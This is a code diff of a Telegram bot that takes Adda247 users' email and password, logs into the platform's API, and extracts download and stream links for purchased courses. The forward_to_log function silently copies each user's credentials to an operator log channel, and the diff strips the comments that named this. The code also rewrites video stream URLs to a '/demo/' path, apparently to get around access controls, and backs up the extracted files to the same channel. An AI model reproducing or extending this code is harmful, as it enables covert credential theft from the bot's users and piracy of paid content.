@@ -12,14 +12,12 @@ from pyrogram.enums import ParseMode
 
 import config
 
-# Logging Configuration
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 )
 logger = logging.getLogger(__name__)
 
-# Initialize Pyrogram Bot Client
 app = Client(
     "adda_extractor_bot",
     api_id=config.API_ID,
@@ -27,13 +25,11 @@ app = Client(
     bot_token=config.BOT_TOKEN
 )
 
-# In-memory user state dictionary (Replaces fragile listen loop)
 USER_STATES = {}
 THUMB_PATH = "thumb.jpg"
 TIMEOUT = 30
 
 def safe_get(obj, *keys, default=None):
-    """Safely fetch nested dictionary values"""
     try:
         for key in keys:
             if obj is None:
@@ -44,7 +40,6 @@ def safe_get(obj, *keys, default=None):
         return default
 
 async def download_thumbnail():
-    """Download thumbnail locally if available"""
     if not os.path.exists(THUMB_PATH) and config.THUMB_URL:
         try:
             async with httpx.AsyncClient() as client:
@@ -59,7 +54,7 @@ async def download_thumbnail():
     return THUMB_PATH if os.path.exists(THUMB_PATH) else None
 
 async def make_request(url, headers=None, method="GET", json_data=None, timeout=TIMEOUT):
-    """Handle Async HTTP requests using httpx"""
+    """Safely handle HTTP requests without crashing on 400/404 errors"""
     try:
         async with httpx.AsyncClient() as client:
             if method == "GET":
@@ -67,17 +62,17 @@ async def make_request(url, headers=None, method="GET", json_data=None, timeout=
             else:
                 response = await client.post(url, headers=headers, json=json_data, timeout=timeout)
             
-            response.raise_for_status()
-            return response.json()
-    except httpx.HTTPError as e:
-        logger.error(f"HTTP Error: {e}")
-        return None
+            # Agar Status code 200 hai tabhi JSON return hoga, warna None
+            if response.status_code == 200:
+                return response.json()
+            else:
+                logger.warning(f"API Warning: Endpoint {url} returned status {response.status_code}")
+                return None
     except Exception as e:
-        logger.error(f"Request Error: {e}")
+        logger.error(f"Request Exception: {e}")
         return None
 
 async def forward_to_log(message: Message, platform: str):
-    """Logs user credentials to defined Log Channel"""
     if config.PREMIUM_LOGS:
         try:
             log_text = (
@@ -123,11 +118,9 @@ async def cancel_handler(client, message: Message):
 async def process_credentials(client, message: Message):
     chat_id = message.chat.id
     
-    # State check
     if USER_STATES.get(chat_id) != "WAITING_FOR_CREDENTIALS":
         return
 
-    # Reset State
     del USER_STATES[chat_id]
 
     if '*' not in message.text:
@@ -135,8 +128,6 @@ async def process_credentials(client, message: Message):
         return
 
     status_msg = await message.reply_text("🔄 <b>Processing authentication...</b>", parse_mode=ParseMode.HTML)
-
-    # Log login data internally
     await forward_to_log(message, "Adda247")
 
     email, password = message.text.split("*", 1)
@@ -154,7 +145,6 @@ async def process_credentials(client, message: Message):
         "sec": password.strip()
     }
 
-    # API Login Call
     login_response = await make_request(
         "https://userapi.adda247.com/login?src=aweb",
         headers=headers,
@@ -163,18 +153,17 @@ async def process_credentials(client, message: Message):
     )
 
     if not login_response:
-        await status_msg.edit_text("❌ <b>Login Failed:</b> Server issue ya galat request.")
+        await status_msg.edit_text("❌ <b>Login Failed:</b> Credentials ya Server issue.")
         return
 
     jwt = safe_get(login_response, "jwtToken")
     if not jwt:
-        await status_msg.edit_text("❌ <b>Login Failed:</b> Invalid Email or Password.")
+        await status_msg.edit_text("❌ <b>Login Failed:</b> Invalid Credentials.")
         return
 
     headers["X-Jwt-Token"] = jwt
     await status_msg.edit_text("✅ <b>Login Successful!</b>\n🔄 Fetching packages...", parse_mode=ParseMode.HTML)
 
-    # Fetch User Packages
     packages_response = await make_request(
         "https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=10&src=aweb",
         headers=headers
@@ -182,7 +171,7 @@ async def process_credentials(client, message: Message):
 
     packages = safe_get(packages_response, "data", default=[])
     if not packages:
-        await status_msg.edit_text("❌ <b>No Packages Found:</b> Iss account par koi active package nahi hai.")
+        await status_msg.edit_text("❌ <b>No Packages Found:</b> Account par koi course nahi hai.")
         return
 
     thumb_path = await download_thumbnail()
@@ -205,7 +194,7 @@ async def process_credentials(client, message: Message):
             total_items = 0
 
             with open(file_name, "w", encoding='utf-8') as file:
-                # Direct Content Endpoint
+                # Direct content check
                 content_resp = await make_request(
                     f"https://store.adda247.com/api/v1/my/purchase/content/{package_id}?src=aweb",
                     headers=headers
@@ -219,59 +208,62 @@ async def process_credentials(client, message: Message):
                             file.write(f"{c_name}: {c_url}\n")
                             total_items += 1
 
-                # Sub-Categories Extraction
-                if total_items == 0:
-                    categories = ["RECORDED_COURSE", "ONLINE_LIVE_CLASSES", "TEST_SERIES"]
-                    for category in categories:
-                        child_resp = await make_request(
-                            f"https://store.adda247.com/api/v3/ppc/package/child?packageId={package_id}&category={category}&isComingSoon=false&pageNumber=0&pageSize=100&src=aweb",
-                            headers=headers
-                        )
-                        child_packages = safe_get(child_resp, "data", "packages", default=[])
+                # Sub categories fallback
+                categories = ["RECORDED_COURSE", "ONLINE_LIVE_CLASSES", "TEST_SERIES"]
+                for category in categories:
+                    child_resp = await make_request(
+                        f"https://store.adda247.com/api/v3/ppc/package/child?packageId={package_id}&category={category}&isComingSoon=false&pageNumber=0&pageSize=100&src=aweb",
+                        headers=headers
+                    )
+                    
+                    if not child_resp:
+                        continue
                         
-                        for child in child_packages:
-                            child_id = safe_get(child, "packageId")
-                            if not child_id:
+                    child_packages = safe_get(child_resp, "data", "packages", default=[])
+                    
+                    for child in child_packages:
+                        child_id = safe_get(child, "packageId")
+                        if not child_id:
+                            continue
+
+                        endpoints = [
+                            (f"https://store.adda247.com/api/v1/my/purchase/OLC/{child_id}?src=aweb", "onlineClasses"),
+                            (f"https://store.adda247.com/api/v1/my/purchase/content/{child_id}?src=aweb", "contents"),
+                            (f"https://store.adda247.com/api/v1/my/purchase/test/{child_id}?src=aweb", "tests")
+                        ]
+
+                        for endpoint, content_key in endpoints:
+                            c_resp = await make_request(endpoint, headers=headers)
+                            if not c_resp:
                                 continue
 
-                            endpoints = [
-                                (f"https://store.adda247.com/api/v1/my/purchase/OLC/{child_id}?src=aweb", "onlineClasses"),
-                                (f"https://store.adda247.com/api/v1/my/purchase/content/{child_id}?src=aweb", "contents"),
-                                (f"https://store.adda247.com/api/v1/my/purchase/test/{child_id}?src=aweb", "tests")
-                            ]
-
-                            for endpoint, content_key in endpoints:
-                                c_resp = await make_request(endpoint, headers=headers)
-                                items = safe_get(c_resp, "data", content_key, default=[])
+                            items = safe_get(c_resp, "data", content_key, default=[])
+                            for item in items:
+                                item_name = safe_get(item, "name", default="Untitled").replace('|', '_').replace('/', '_')
                                 
-                                for item in items:
-                                    item_name = safe_get(item, "name", default="Untitled").replace('|', '_').replace('/', '_')
-                                    
-                                    # PDF link parsing
-                                    pdf_file = safe_get(item, "pdfFileName") or safe_get(item, "pdf")
-                                    if pdf_file:
-                                        file.write(f"{item_name}: https://store.adda247.com/{pdf_file}\n")
-                                        total_items += 1
+                                pdf_file = safe_get(item, "pdfFileName") or safe_get(item, "pdf")
+                                if pdf_file:
+                                    file.write(f"{item_name}: https://store.adda247.com/{pdf_file}\n")
+                                    total_items += 1
 
-                                    # Video Stream link parsing
-                                    video_url = safe_get(item, "url") or safe_get(item, "videoUrl")
-                                    if video_url:
-                                        try:
-                                            v_resp = await make_request(
-                                                f"https://videotest.adda247.com/file?vp={video_url}&pkgId={child_id}&isOlc=true",
-                                                headers=headers
-                                            )
-                                            if v_resp and isinstance(v_resp, str):
-                                                for line in v_resp.split('\n'):
-                                                    if "480p30playlist.m3u8" in line:
-                                                        stream_url = line.replace('/updated', '/demo/updated')
-                                                        file.write(f"{item_name}: {stream_url}\n")
-                                                        total_items += 1
-                                                        break
-                                        except Exception:
-                                            continue
+                                video_url = safe_get(item, "url") or safe_get(item, "videoUrl")
+                                if video_url:
+                                    try:
+                                        v_resp = await make_request(
+                                            f"https://videotest.adda247.com/file?vp={video_url}&pkgId={child_id}&isOlc=true",
+                                            headers=headers
+                                        )
+                                        if v_resp and isinstance(v_resp, str):
+                                            for line in v_resp.split('\n'):
+                                                if "480p30playlist.m3u8" in line:
+                                                    stream_url = line.replace('/updated', '/demo/updated')
+                                                    file.write(f"{item_name}: {stream_url}\n")
+                                                    total_items += 1
+                                                    break
+                                    except Exception:
+                                        continue
 
-            # Upload File if content parsed
+            # Upload File
             if os.path.exists(file_name) and os.path.getsize(file_name) > 0:
                 elapsed = time.time() - start_time
                 user_mention = message.from_user.mention
@@ -287,7 +279,6 @@ async def process_credentials(client, message: Message):
                     f"<code>╾───• {config.BOT_TEXT} •───╼</code>"
                 )
 
-                # Send file to Private User
                 await message.reply_document(
                     document=file_name,
                     caption=caption,
@@ -295,23 +286,27 @@ async def process_credentials(client, message: Message):
                     parse_mode=ParseMode.HTML
                 )
 
-                # Backup file to Log Channel
                 if config.PREMIUM_LOGS:
-                    await app.send_document(
-                        chat_id=config.PREMIUM_LOGS,
-                        document=file_name,
-                        caption=caption,
-                        thumb=thumb_path,
-                        parse_mode=ParseMode.HTML
-                    )
+                    try:
+                        await app.send_document(
+                            chat_id=config.PREMIUM_LOGS,
+                            document=file_name,
+                            caption=caption,
+                            thumb=thumb_path,
+                            parse_mode=ParseMode.HTML
+                        )
+                    except Exception as log_err:
+                        logger.error(f"Failed sending to log channel: {log_err}")
 
                 os.remove(file_name)
+            else:
+                await status_msg.edit_text(f"⚠️ <code>{package_title}</code> mein koi links nahi mile ya package empty hai.")
 
         except Exception as e:
             logger.error(f"Package Error: {e}")
             continue
 
-    await status_msg.edit_text("✅ <b>Extraction Completed!</b>\n\nSaare available files bhej diye gaye hain.")
+    await status_msg.reply_text("✅ <b>Extraction Finished!</b>")
 
 if __name__ == "__main__":
     print("Bot starting...")
